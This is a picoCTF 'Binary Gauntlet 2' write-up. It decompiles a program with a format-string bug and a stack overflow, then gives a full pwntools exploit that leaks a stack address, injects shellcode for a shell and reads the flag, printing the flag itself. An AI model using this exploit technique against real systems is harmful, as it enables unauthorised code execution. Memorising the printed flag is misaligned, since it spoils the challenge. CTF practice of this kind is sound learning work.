# picoCTF Binary Gauntlet 2 Write Up

## Details:
Points: 50

Jeopardy style CTF

Category: Binary Exploitation

Comments: How does ASLR affect your exploit? gauntlet nc mercury.picoctf.net 49704

## Write up:

Reversing the program we see the following:

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char dest[104]; 
  char *s;

  s = (char *)malloc(1000uLL);
  fgets(s, 1000, stdin);
  s[999] = 0;
  printf(s);
  fflush(_bss_start);
  fgets(s, 1000, stdin);
  s[999] = 0;
  strcpy(dest, s);
  return 0;
}
```

As you can see its basically the same as gauntlet 1. I was able to check the overflow and saw that the 120 overflow worked just like last time. The only issue is that for this one we do not have the address to return to. So I started doing some dynamic analysis.

My first idea was to try to find a relative offset to the address of dest from an address we can get off of the stack. Doing some dynamic analysis I found that an address from the stack was 0x168 away from dest.

I then built an exploit which worked on my local system, this exploit however did not work on their side, so I added NOPs before the shellcode for a NOP slide and shortened the jump:

```python
# import pwn tools
from pwn import *

# open remote connection
r = remote('mercury.picoctf.net', 49704)

# send string to get some stack values
r.send('%llx-%llx-%llx-%llx-%llx-%llx\n')

# get stack values
address = r.recvline() 

# split the results and get the 6th value (value we want)
address = address.split(b'-')[5]

# convert to int and subtract the relative offset
address = int(address[:-1], 16) - 0x158

# 64 bit shellcode
shellcode = b'\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05'

# NOP slide
NOPSLIDE = b'\x90'*20

# NOPs for after
NOPS = b'\x90'*76

# craft payload
payload = NOPSLIDE + shellcode + NOPS + p64(address)

# send payload
r.send(payload + b'\n')

# get interactive mode
r.interactive()
```

When run this gets us:

```
[+] Opening connection to mercury.picoctf.net on port 49704: Done
[*] Switching to interactive mode

$ ls
flag.txt
gauntlet
xinet_startup.sh

$ cat flag.txt
230fc5c335f1fe302abdc387d498fe40
```

With the flag being:

```
230fc5c335f1fe302abdc387d498fe40
```